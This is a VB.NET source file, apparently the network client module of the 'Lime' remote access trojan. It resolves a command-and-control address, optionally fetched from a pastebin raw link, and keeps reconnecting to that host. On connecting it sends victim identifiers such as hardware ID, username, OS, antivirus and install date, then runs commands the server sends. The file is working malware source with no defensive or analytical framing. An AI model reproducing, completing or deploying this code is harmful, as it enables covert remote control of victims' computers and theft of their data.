
Imports System.IO
Imports System.Net.Sockets
Imports System.Threading

Namespace Lime
    Public Class SK
        'Credit=DRHAZEM
        Public Shared Sub rc()

            M = New MemoryStream
            B = New Byte(0) {}
            I = -1

            Do While True
                Try

                    Try
                        If Host.ToString.ToLower.Contains("pastebin.com/raw/".ToLower) Then
                            Dim webx As New Net.WebClient
                            Host = webx.DownloadString(Host)
                        End If
                    Catch ex As Exception
                    End Try

                    S = New TcpClient
                    S.ReceiveBufferSize = 9000000
                    S.SendBufferSize = 9000000
                    S.ReceiveTimeout = -1
                    S.SendTimeout = -1
                    S.Connect(Host, port)

                    If S.Connected Then
                        Send(String.Concat("INFO", SPL, ID.HWID, SPL, ID.UserName, SPL, ID.LV3(),
                                       SPL, ID.BinName, SPL, ID.GLOC, SPL, ID.GOS + " " + ID.Bit, SPL, Settings.LVER,
                                       SPL, ID.INDATE, SPL, ID.GAV, SPL, Settings.SPUSB_TEXT))
                    End If

                Catch Chek As SocketException
                    Thread.Sleep(2500)
                    S = Nothing
                    Continue Do
                End Try
                Try


                    Do Until S.Client.Poll(-1, SelectMode.SelectRead) AndAlso S.Available <= 0
                        Thread.Sleep(20)

                        If S.Available > 0 Then

                            Dim INT As Integer = S.Client.Receive(B, 0, B.Length, SocketFlags.None)

                            If I = -1 Then
                                If B(0) = 0 Then
                                    I = Integer.Parse(GS(M.ToArray))
                                    B = New Byte(CInt(I)) {}
                                    M.Dispose() : M = New MemoryStream
                                Else
                                    M.WriteByte(B(0))
                                End If
                            Else
                                M.Write(B, 0, INT)
                                Dim T As New Thread(New ParameterizedThreadStart(AddressOf Commands.DT), 1)
                                T.Start(M.ToArray)
                                T.Join(1000)
                                M.Dispose() : M = New MemoryStream
                                B = New Byte(0) {}
                                I = -1
                            End If

                        End If


                    Loop

                Catch ex As Exception

                End Try


                Close()



            Loop



        End Sub


        Public Shared Sub Close()
            Try
                M.Dispose()
            Catch ex As Exception


            End Try

            Try
                M = New MemoryStream
            Catch ex As Exception

            End Try

            Try
                B = New Byte(0) {}
            Catch ex As Exception

            End Try
            Try
                I = -1
            Catch ex As Exception

            End Try


            Try
                S.Client.Disconnect(False)
            Catch ex As Exception

            End Try

            Try
                S.Close()
            Catch ex As Exception
            End Try

            Try
                S = Nothing
            Catch ex As Exception

            End Try
        End Sub

        Public Shared Sub Send(ByVal msg As String)
            Dim M As New MemoryStream
            Try
                Dim b() As Byte = GB(Len(msg) & ChrW(0))
                Dim b0() As Byte = GB(msg)
                M.Write(b, 0, b.Length)
                M.Write(b0, 0, b0.Length)
                S.Client.Send(M.ToArray, 0, M.Length, SocketFlags.None)

                M.Dispose()
            Catch ex As Exception
                M = Nothing
            End Try
        End Sub


        Public Shared Function GB(ByVal s As String) As Byte()
            Return System.Text.Encoding.Default.GetBytes(s)
        End Function


        Public Shared Function GS(ByRef b() As Byte) As String
            Return System.Text.Encoding.Default.GetString(b)
        End Function



        Public Shared S As TcpClient
        Public Shared B() As Byte = New Byte(0) {}
        Public Shared Host As String = Settings.LHOST, port As Integer = Settings.LPORT
        Public Shared M As MemoryStream
        Public Shared SPL As String = Settings.SPL
        Public Shared I As Integer = -1

    End Class
End Namespace